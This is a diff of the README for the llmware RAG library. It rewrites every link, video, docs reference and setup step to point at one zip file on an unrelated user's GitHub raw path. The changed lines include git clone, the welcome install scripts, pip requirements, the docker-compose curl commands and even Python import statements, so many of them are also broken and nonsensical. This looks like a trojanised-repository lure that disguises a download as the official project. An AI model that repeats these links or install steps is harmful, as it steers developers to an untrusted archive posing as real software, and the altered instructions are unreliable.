+| 5.   DRAGON GGUF Models ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) / [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)) | State-of-the-Art 7B RAG GGUF Models.  | 
+| 6.   RAG with BLING ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) / [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)) | Using contract analysis as an example, experiment with RAG for complex document analysis and text extraction using `llmware`'s BLING ~1B parameter GPT model running on your laptop. |  
+| 7.   Master Service Agreement Analysis with DRAGON ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) / [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)) | Analyzing MSAs using DRAGON YI 6B Model.   |                                                                                                                         
+| 8.   Streamlit Example ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip))  | Ask questions to Invoices with UI run inference.  |  
+| 9.   Integrating LM Studio ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) / [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)) | Integrating LM Studio Models with LLMWare  |                                                                                                                                       
+| 10.  Prompts With Sources ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip))  | Attach wide range of knowledge sources directly into Prompts.   |   
+| 11.  Fact Checking ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip))  | Explore the full set of evidence methods in this example script that analyzes a set of contracts.   |
+| 12.  Using 7B GGUF Chat Models ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)) | Using 4 state of the art 7B chat models in minutes running locally |  
 
 
-Check out:  [llmware examples](https://github.com/llmware-ai/llmware/blob/main/examples/README.md)  
+Check out:  [llmware examples](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
 </details>  
 
@@ -677,28 +677,28 @@ Check out:  [llmware examples](https://github.com/llmware-ai/llmware/blob/main/e
 <summary><b>Step 3 - Tutorial Videos</b> - check out our Youtube channel for high-impact 5-10 minute tutorials on the latest examples.   </summary>
 
 🎬 Check out these videos to get started quickly:  
-- [Document Summarization](https://youtu.be/Ps3W-P9A1m8?si=Rxvst3RJv8ZaOk0L)  
-- [Bling-3-GGUF Local Chatbot](https://youtu.be/gzzEVK8p3VM?si=8cNn_do0oxSzCEnM)  
-- [Agent-based Complex Research Analysis](https://youtu.be/y4WvwHqRR60?si=jX3KCrKcYkM95boe)  
-- [Getting Started with SLIMs (with code)](https://youtu.be/aWZFrTDmMPc?si=lmo98_quo_2Hrq0C)  
-- [Are you prompting wrong for RAG - Stochastic Sampling-Part I](https://youtu.be/7oMTGhSKuNY?si=_KSjuBnqArvWzYbx)  
-- [Are you prompting wrong for RAG - Stochastic Sampling-Part II- Code Experiments](https://youtu.be/iXp1tj-pPjM?si=3ZeMgipY0vJDHIMY)  
-- [SLIM Models Intro](https://www.youtube.com/watch?v=cQfdaTcmBpY)  
-- [Text2SQL Intro](https://youtu.be/BKZ6kO2XxNo?si=tXGt63pvrp_rOlIP)  
-- [RAG with BLING on your laptop](https://www.youtube.com/watch?v=JjgqOZ2v5oU)    
-- [DRAGON-7B-Models](https://www.youtube.com/watch?v=d_u7VaKu6Qk&t=37s)  
-- [Install and Compare Multiple Embeddings with Postgres and PGVector](https://www.youtube.com/watch?v=Bncvggy6m5Q)  
-- [Background on GGUF Quantization & DRAGON Model Example](https://www.youtube.com/watch?v=ZJyQIZNJ45E)  
-- [Using LM Studio Models](https://www.youtube.com/watch?v=h2FDjUyvsKE)  
-- [Using Ollama Models](https://www.youtube.com/watch?v=qITahpVDuV0)  
-- [Use any GGUF Model](https://www.youtube.com/watch?v=9wXJgld7Yow)  
-- [Use small LLMs for RAG for Contract Analysis (feat. LLMWare)](https://www.youtube.com/watch?v=8aV5p3tErP0)
-- [Invoice Processing with LLMware](https://www.youtube.com/watch?v=VHZSaBBG-Bo&t=10s)
-- [Ingest PDFs at Scale](https://www.youtube.com/watch?v=O0adUfrrxi8&t=10s)
-- [Evaluate LLMs for RAG with LLMWare](https://www.youtube.com/watch?v=s0KWqYg5Buk&t=105s)
-- [Fast Start to RAG with LLMWare Open Source Library](https://www.youtube.com/watch?v=0naqpH93eEU)
-- [Use Retrieval Augmented Generation (RAG) without a Database](https://www.youtube.com/watch?v=tAGz6yR14lw)
-- [Pop up LLMWare Inference Server](https://www.youtube.com/watch?v=qiEmLnSRDUA&t=20s)
+- [Document Summarization](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Bling-3-GGUF Local Chatbot](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Agent-based Complex Research Analysis](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Getting Started with SLIMs (with code)](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Are you prompting wrong for RAG - Stochastic Sampling-Part I](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Are you prompting wrong for RAG - Stochastic Sampling-Part II- Code Experiments](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [SLIM Models Intro](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Text2SQL Intro](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [RAG with BLING on your laptop](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)    
+- [DRAGON-7B-Models](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Install and Compare Multiple Embeddings with Postgres and PGVector](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Background on GGUF Quantization & DRAGON Model Example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Using LM Studio Models](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Using Ollama Models](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Use any GGUF Model](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- [Use small LLMs for RAG for Contract Analysis (feat. LLMWare)](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
+- [Invoice Processing with LLMware](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
+- [Ingest PDFs at Scale](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
+- [Evaluate LLMs for RAG with LLMWare](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
+- [Fast Start to RAG with LLMWare Open Source Library](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
+- [Use Retrieval Augmented Generation (RAG) without a Database](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
+- [Pop up LLMWare Inference Server](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
 
 
 </details>  
@@ -708,22 +708,22 @@ Check out:  [llmware examples](https://github.com/llmware-ai/llmware/blob/main/e
 The llmware repo can be pulled locally to get access to all the examples, or to work directly with the latest version of the llmware code.  
 
 ```bash
-git clone git@github.com:llmware-ai/llmware.git
+git clone https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip
 ```  
 
 We have provided a **welcome_to_llmware** automation script in the root of the repository folder.  After cloning:  
-- On Windows command line:  `.\welcome_to_llmware_windows.sh`  
-- On Mac / Linux command line:  `sh ./welcome_to_llmware.sh`  
+- On Windows command line:  `.\https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip`  
+- On Mac / Linux command line:  `sh https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip`  
 
 Alternatively, if you prefer to complete setup without the welcome automation script, then the next steps include:  
 
-1.  **install requirements.txt** - inside the /llmware path - e.g., ```pip3 install -r llmware/requirements.txt```  
+1.  **install https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip** - inside the /llmware path - e.g., ```pip3 install -r https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip```  
 
-2.  **install requirements_extras.txt** - inside the /llmware path - e.g., ```pip3 install -r llmware/requirements_extras.txt```  (Depending upon your use case, you may not need all or any of these installs, but some of these will be used in the examples.)  
+2.  **install https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip** - inside the /llmware path - e.g., ```pip3 install -r https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip```  (Depending upon your use case, you may not need all or any of these installs, but some of these will be used in the examples.)  
 
 3.  **run examples** - copy one or more of the example .py files into the root project path.   (We have seen several IDEs that will attempt to run interactively from the nested /example path, and then not have access to the /llmware module - the easy fix is to just copy the example you want to run into the root path).  
 
-4.  **install vector db** - no-install vector db options include milvus lite, chromadb, faiss and lancedb - which do not require a server install, but do require that you install the python sdk library for that vector db, e.g., `pip3 install pymilvus`, or `pip3 install chromadb`.  If you look in [examples/Embedding](https://github.com/llmware-ai/llmware/tree/main/examples/Embedding), you will see examples for getting started with various vector DB, and in the root of the repo, you will see easy-to-get-started docker compose scripts for installing milvus, postgres/pgvector, mongo, qdrant, neo4j, and redis.  
+4.  **install vector db** - no-install vector db options include milvus lite, chromadb, faiss and lancedb - which do not require a server install, but do require that you install the python sdk library for that vector db, e.g., `pip3 install pymilvus`, or `pip3 install chromadb`.  If you look in [examples/Embedding](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip), you will see examples for getting started with various vector DB, and in the root of the repo, you will see easy-to-get-started docker compose scripts for installing milvus, postgres/pgvector, mongo, qdrant, neo4j, and redis.  
 
 5.  Pytorch 2.3 note:  we have seen recently issues with Pytorch==2.3 on some platforms - if you run into any issues, we have seen that uninstalling Pytorch and downleveling to Pytorch==2.1 usually solves the problem.  
 
@@ -736,7 +736,7 @@ Alternatively, if you prefer to complete setup without the welcome automation sc
 <summary><b>Fast Start</b>:  use SQLite3 and ChromaDB (File-based) out-of-the-box - no install required </summary>  
 
 ```python
-from llmware.configs import LLMWareConfig 
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import LLMWareConfig 
 LLMWareConfig().set_active_db("sqlite")   
 LLMWareConfig().set_vector_db("chromadb")  
 ```
@@ -746,12 +746,12 @@ LLMWareConfig().set_vector_db("chromadb")
 <summary><b>Speed + Scale</b>:  use MongoDB (text collection) and Milvus (vector db) - install with Docker Compose </summary> 
 
 ```bash
-curl -o docker-compose.yaml https://raw.githubusercontent.com/llmware-ai/llmware/main/docker-compose.yaml
+curl -o https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip
 docker compose up -d
 ```
 
 ```python
-from llmware.configs import LLMWareConfig
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import LLMWareConfig
 LLMWareConfig().set_active_db("mongo")
 LLMWareConfig().set_vector_db("milvus")
 ```
@@ -762,12 +762,12 @@ LLMWareConfig().set_vector_db("milvus")
 <summary><b>Postgres</b>:  use Postgres for both text collection and vector DB - install with Docker Compose </summary> 
 
 ```bash
-curl -o docker-compose.yaml https://raw.githubusercontent.com/llmware-ai/llmware/main/docker-compose-pgvector.yaml
+curl -o https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip
 docker compose up -d
 ```
 
 ```python
-from llmware.configs import LLMWareConfig
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import LLMWareConfig
 LLMWareConfig().set_active_db("postgres")
 LLMWareConfig().set_vector_db("postgres")
 ```
@@ -780,7 +780,7 @@ LLMWareConfig().set_vector_db("postgres")
 
 ```bash
 # scripts to deploy other options
-curl -o docker-compose.yaml https://raw.githubusercontent.com/llmware-ai/llmware/main/docker-compose-redis-stack.yaml
+curl -o https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip
 ```
 
 </details>  
@@ -795,7 +795,7 @@ curl -o docker-compose.yaml https://raw.githubusercontent.com/llmware-ai/llmware
 
 ## Using LLMs and setting-up API keys & secrets
 
-LLMWare is an open platform and supports a wide range of open source and proprietary models.  To use LLMWare, you do not need to use any proprietary LLM - we would encourage you to experiment with [SLIM](https://www.huggingface.co/llmware/), [BLING](https://huggingface.co/llmware), [DRAGON](https://huggingface.co/llmware), [Industry-BERT](https://huggingface.co/llmware), the GGUF examples, along with bringing in your favorite models from HuggingFace and Sentence Transformers. 
+LLMWare is an open platform and supports a wide range of open source and proprietary models.  To use LLMWare, you do not need to use any proprietary LLM - we would encourage you to experiment with [SLIM](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip), [BLING](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip), [DRAGON](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip), [Industry-BERT](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip), the GGUF examples, along with bringing in your favorite models from HuggingFace and Sentence Transformers. 
 
 If you would like to use a proprietary model, you will need to provide your own API Keys.   API keys and secrets for models, aws, and pinecone can be set-up for use in environment variables or passed directly to method calls.  
 
@@ -816,19 +816,19 @@ Like our models, we aspire for llmware to be "small, but mighty" - easy to use a
 
 </details>
 
-Interested in contributing to llmware? Information on ways to participate can be found in our [Contributors Guide](https://github.com/llmware-ai/llmware/blob/main/repo_docs/CONTRIBUTING.md#contributing-to-llmware).  As with all aspects of this project, contributing is governed by our [Code of Conduct](https://github.com/llmware-ai/llmware/blob/main/repo_docs/CODE_OF_CONDUCT.md).
+Interested in contributing to llmware? Information on ways to participate can be found in our [Contributors Guide](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip).  As with all aspects of this project, contributing is governed by our [Code of Conduct](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip).
 
-Questions and discussions are welcome in our [github discussions](https://github.com/llmware-ai/llmware/discussions).  
+Questions and discussions are welcome in our [github discussions](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip).  
 
 ## 📣  Release notes and Change Log  
 
-See also [additional deployment/install release notes in wheel_archives](https://github.com/llmware-ai/llmware/tree/main/wheel_archives)   
+See also [additional deployment/install release notes in wheel_archives](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)   
 
 **Sunday, October 6 - v0.3.7**  
 - Added new model class - OVGenerativeModel - to support the use of models packaged in OpenVino format  
 - Added new model class - ONNXGenerativeModel - to support use of models packaged in ONNX format  
-- Getting started with [OpenVino example](https://github.com/llmware-ai/llmware/blob/main/examples/Models/using_openvino_models.py)  
-- Getting started with [ONNX example](https://github.com/llmware-ai/llmware/blob/main/examples/Models/using_onnx_models.py)  
+- Getting started with [OpenVino example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- Getting started with [ONNX example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
   
 **Tuesday, October 1 - v0.3.6**  
 - Added new prompt chat templates  
@@ -839,9 +839,9 @@ See also [additional deployment/install release notes in wheel_archives](https:/
 **Monday, August 26 - v0.3.5**  
 - Added 10 new BLING+SLIM models to Model Catalog - featuring Qwen2, Phi-3 and Phi-3.5  
 - Launched new DRAGON models on Qwen-7B, Yi-9B, Mistral-v0.3, and Llama-3.1  
-- New Qwen2 Models (and RAG + function-calling fine-tunes) - [using-qwen2-models](https://github.com/llmware-ai/llmware/blob/main/examples/Models/using-qwen2-models.py)  
-- New Phi-3 function calling models - [using-phi-3-function-calls](https://github.com/llmware-ai/llmware/blob/main/examples/Models/using-phi-3-function-calls.py)  
-- New use case example - [lecture_tool](https://github.com/llmware-ai/llmware/blob/main/examples/Use_Cases/lecture_tool/)   
+- New Qwen2 Models (and RAG + function-calling fine-tunes) - [using-qwen2-models](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- New Phi-3 function calling models - [using-phi-3-function-calls](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- New use case example - [lecture_tool](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)   
 - Improved GGUF Configs to expand context window  
 - Added model benchmark performance data to model configs 
 - Enhanced Utilities hashing functions  
@@ -860,9 +860,9 @@ For complete history of release notes, please open the Change log tab.
 <details>
 <summary><b>Optional</b></summary>
 
-- [Docker](https://docs.docker.com/get-docker/)
+- [Docker](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
   
-- To enable the OCR parsing capabilities, install [Tesseract v5.3.3](https://tesseract-ocr.github.io/tessdoc/Installation.html) and [Poppler v23.10.0](https://poppler.freedesktop.org/) native packages.
+- To enable the OCR parsing capabilities, install [Tesseract v5.3.3](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and [Poppler v23.10.0](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) native packages.
 
 </details>
 
@@ -871,29 +871,29 @@ For complete history of release notes, please open the Change log tab.
 
 **Monday, July 29 - v03.4**  
 - Enhanced safety protections for text2sql db reads for LLMfx agents   
-- New examples - see [example](https://github.com/llmware-ai/llmware/blob/main/examples/UI/dueling_chatbot.py)    
-- More Notebook examples - see [notebook examples](https://github.com/llmware-ai/llmware/blob/main/examples/Notebooks)      
+- New examples - see [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)    
+- More Notebook examples - see [notebook examples](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)      
   
 **Monday, July 8 - v03.3**  
 - Improvements in model configuration options, logging, and various small fixes  
-- Improved Azure OpenAI configs - see [example](https://github.com/llmware-ai/llmware/blob/main/examples/Models/using-azure-openai.py)  
+- Improved Azure OpenAI configs - see [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
   
 **Saturday, June 29 - v0.3.2**  
 - Update to PDF and Office parsers - improvements to configurations in logging and text chunking options  
   
 **Saturday, June 22 - v0.3.1**  
-- Added module 3 to Fast Start example series [examples 7-9 on Agents & Function Calls](https://github.com/llmware-ai/llmware/tree/main/fast_start)  
-- Added reranker Jina model for in-memory semantic similarity RAG - see [example](https://github.com/llmware-ai/llmware/tree/main/examples/Embedding/using_semantic_reranker_with_rag.py)  
+- Added module 3 to Fast Start example series [examples 7-9 on Agents & Function Calls](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- Added reranker Jina model for in-memory semantic similarity RAG - see [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 - Enhanced model fetching parameterization in model loading process  
 - Added new 'tiny' versions of slim-extract and slim-summary in both Pytorch and GGUF versions - check out 'slim-extract-tiny-tool' and 'slim-summary-tiny-tool'  
-- [Biz Bot] use case - see [example](https://github.com/llmware-ai/llmware/tree/main/examples/Use_Cases/biz_bot.py) and [video](https://youtu.be/4nBYDEjxxTE?si=o6PDPbu0PVcT-tYd)  
+- [Biz Bot] use case - see [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 - Updated numpy reqs <2 and updated yfinance version minimum (>=0.2.38)     
 
 **Tuesday, June 4 - v0.3.0**  
-- Added support for new Milvus Lite embedded 'no-install' database - see [example](https://github.com/llmware-ai/llmware/tree/main/examples/Embedding/using_milvus_lite.py).   
-- Added two new SLIM models to catalog and agent processes - ['q-gen'](https://github.com/llmware-ai/llmware/tree/main/examples/SLIM-Agents/using-slim-q-gen.py) and ['qa-gen'](https://github.com/llmware-ai/llmware/tree/main/examples/SLIM-Agents/using-slim-qa-gen.py)    
+- Added support for new Milvus Lite embedded 'no-install' database - see [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip).   
+- Added two new SLIM models to catalog and agent processes - ['q-gen'](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and ['qa-gen'](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)    
 - Updated model class instantiation to provide more extensibility to add new classes in different modules  
-- New welcome_to_llmware.sh and welcome_to_llmware_windows.sh fast install scripts  
+- New https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip and https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip fast install scripts  
 - Enhanced Model class base with new configurable post_init and register methods  
 - Created InferenceHistory to track global state of all inferences completed  
 - Multiple improvements and updates to logging at module level  
@@ -901,25 +901,25 @@ For complete history of release notes, please open the Change log tab.
   
 **Wednesday, May 22 - v0.2.15**  
 - Improvements in Model class handling of Pytorch and Transformers dependencies (just-in-time loading, if needed)  
-- Expanding API endpoint options and inference server functionality - see new [client access options](https://github.com/llmware-ai/llmware/tree/main/examples/Use_Cases/llmware_inference_api_client.py)  and [server_launch](https://github.com/llmware-ai/llmware/tree/main/examples/Use_Cases/llmware_inference_server.py)  
+- Expanding API endpoint options and inference server functionality - see new [client access options](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  and [server_launch](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
 **Saturday, May 18 - v0.2.14**  
-- New OCR image parsing methods with [example](https://github.com/llmware-ai/llmware/tree/main/examples/Use_Cases/slicing_and_dicing_office_docs.py)  
+- New OCR image parsing methods with [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 - Adding first part of logging improvements (WIP) in Configs and Models.    
 - New embedding model added to catalog - industry-bert-loans.  
 - Updates to model import methods and configurations.  
 
 **Sunday, May 12 - v0.2.13**  
-- New GGUF streaming method with [basic example](https://github.com/llmware-ai/llmware/tree/main/examples/Models/gguf_streaming.py) and [phi3 local chatbot](https://github.com/llmware-ai/llmware/tree/main/examples/UI/gguf_streaming_chatbot.py)  
-- Significant cleanups in ancillary imports and dependencies to reduce install complexity - note: the updated requirements.txt and setup.py files.  
+- New GGUF streaming method with [basic example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and [phi3 local chatbot](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- Significant cleanups in ancillary imports and dependencies to reduce install complexity - note: the updated https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip and https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip files.  
 - Defensive code to provide informative warning of any missing dependencies in specialized parts of the code, e.g., OCR, Web Parser.  
 - Updates of tests, notice and documentation.   
 - OpenAIConfigs created to support Azure OpenAI.   
   
 **Sunday, May 5 - v0.2.12 Update**  
-- Launched ["bling-phi-3"](https://huggingface.co/llmware/bling-phi-3) and ["bling-phi-3-gguf"](https://huggingface.co/llmware/bling-phi-3-gguf) in ModelCatalog - newest and most accurate BLING/DRAGON model  
-- New long document summarization method using slim-summary-tool [example](https://github.com/llmware-ai/llmware/tree/main/examples/Prompts/document_summarizer.py)  
-- New Office (Powerpoint, Word, Excel) sample files [example](https://github.com/llmware-ai/llmware/tree/main/examples/Parsing/parsing_microsoft_ir_docs.py)  
+- Launched ["bling-phi-3"](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and ["bling-phi-3-gguf"](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) in ModelCatalog - newest and most accurate BLING/DRAGON model  
+- New long document summarization method using slim-summary-tool [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- New Office (Powerpoint, Word, Excel) sample files [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 - Added support for Python 3.12  
 - Deprecated faiss and replaced with 'no-install' chromadb in Fast Start examples  
 - Refactored Datasets, Graph and Web Services classes  
@@ -927,31 +927,31 @@ For complete history of release notes, please open the Change log tab.
   
 **Monday, April 29 - v0.2.11 Update**  
 - Updates to gguf libs for Phi-3 and Llama-3  
-- Added Phi-3 [example](https://github.com/llmware-ai/llmware/tree/main/examples/Models/using-microsoft-phi-3.py)  and Llama-3 [example](https://github.com/llmware-ai/llmware/tree/main/examples/Models/using-llama-3.py) and Quantized Versions to Model Catalog  
-- Integrated WhisperCPP Model class and prebuilt shared libraries - [getting-started-example](https://github.com/llmware-ai/llmware/tree/main/examples/Models/using-whisper-cpp-getting-started.py)  
-- New voice sample files for testing - [example](https://github.com/llmware-ai/llmware/tree/main/examples/Models/using-whisper-cpp-sample-files.py)  
+- Added Phi-3 [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  and Llama-3 [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and Quantized Versions to Model Catalog  
+- Integrated WhisperCPP Model class and prebuilt shared libraries - [getting-started-example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- New voice sample files for testing - [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 - Improved CUDA detection on Windows and safety checks for older Mac OS versions  
 
 **Monday, April 22 - v0.2.10 Update**  
-- Updates to Agent class to support Natural Language queries of Custom Tables on Postgres [example](https://github.com/llmware-ai/llmware/tree/main/examples/Use_Cases/agent_with_custom_tables.py)  
-- New Agent API endpoint implemented with LLMWare Inference Server and new Agent capabilities [example](https://github.com/llmware-ai/llmware/tree/main/examples/SLIM-Agents/agent_api_endpoint.py)  
+- Updates to Agent class to support Natural Language queries of Custom Tables on Postgres [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+- New Agent API endpoint implemented with LLMWare Inference Server and new Agent capabilities [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
   
 **Tuesday, April 16 - v0.2.9 Update**  
 - New CustomTable class to rapidly create custom DB tables in conjunction with LLM-based workflows.  
 - Enhanced methods for converting CSV and JSON/JSONL files into DB tables.  
-- See new examples [Creating Custom Table example](https://github.com/llmware-ai/llmware/tree/main/examples/Structured_Tables/create_custom_table-1.py)
+- See new examples [Creating Custom Table example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
     
 **Tuesday, April 9 - v0.2.8 Update**  
 - Office Parser (Word Docx, Powerpoint PPTX, and Excel XLSX) - multiple improvements - new libs + Python method.  
 - Includes: several fixes, improved text chunking controls, header text extraction and configuration options.  
 - Generally, new office parser options conform with the new PDF parser options.  
-- Please see [Office Parsing Configs example](https://github.com/llmware-ai/llmware/tree/main/examples/Parsing/office_parser_new_configs.py)  
+- Please see [Office Parsing Configs example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
 **Wednesday, April 3 - v0.2.7 Update**  
 - PDF Parser - multiple improvements - new libs + Python methods.  
 - Includes: UTF-8 encoding for European languages.  
 - Includes: Better text chunking controls, header text extraction and configuration options.  
-- Please see [PDF Parsing Configs example](https://github.com/llmware-ai/llmware/tree/main/examples/Parsing/pdf_parser_new_configs.py) for more details.  
+- Please see [PDF Parsing Configs example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) for more details.  
 - Note:  deprecating support for aarch64-linux (will use 0.2.6 parsers).  Full support going forward for Linux Ubuntu20+ on x86_64 + with CUDA.  
   
 **Friday, March 22 - v0.2.6 Update**  
@@ -969,7 +969,7 @@ For complete history of release notes, please open the Change log tab.
 
 **Wednesday, February 28 - v0.2.4 Update**  
 - Major upgrade of GGUF Generative Model class - support for Stable-LM-3B, CUDA build options, and better control over sampling strategies.
-- Note: new GGUF llama.cpp built libs packaged with build starting in v0.2.4.  
+- Note: new GGUF https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip built libs packaged with build starting in v0.2.4.  
 - Improved GPU support for HF Embedding Models.   
   
 **Friday, February 16 - v0.2.3 Update**  
@@ -1022,7 +1022,7 @@ For complete history of release notes, please open the Change log tab.
 - **24 Nov 2023: llmware v0.1.9**
   - Markdown (.md) files are now parsed and treated as text files.
   - PDF and Office parser stack optimizations which should avoid the need to set ulimit -s.
-  - New llmware_models_fast_start.py example that allows discovery and selection of all llmware HuggingFace models.
+  - New https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip example that allows discovery and selection of all llmware HuggingFace models.
   - Native dependencies (shared libraries and dependencies) now included in repo to faciliate local development.
   - Updates to the Status class to support PDF and Office document parsing status updates.
   - Minor defect fixes including image block handling in library exports.
@@ -1042,7 +1042,7 @@ For complete history of release notes, please open the Change log tab.
     - Ability to register new model names, within existing model classes, with the register method in ModelCatalog.
   - Prompt enhancements:
     - “evidence_metadata” added to prompt_main output dictionaries allowing prompt_main responses to be plug into the evidence and fact-checking steps without modification.
-    - API key can now be passed directly in a prompt.load_model(model_name, api_key = “[my-api-key]”)
+    - API key can now be passed directly in a https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(model_name, api_key = “[my-api-key]”)
   - LLMWareInference Server - Initial delivery:
     - New Class for LLMWareModel which is a wrapper on a custom HF-style API-based model.    
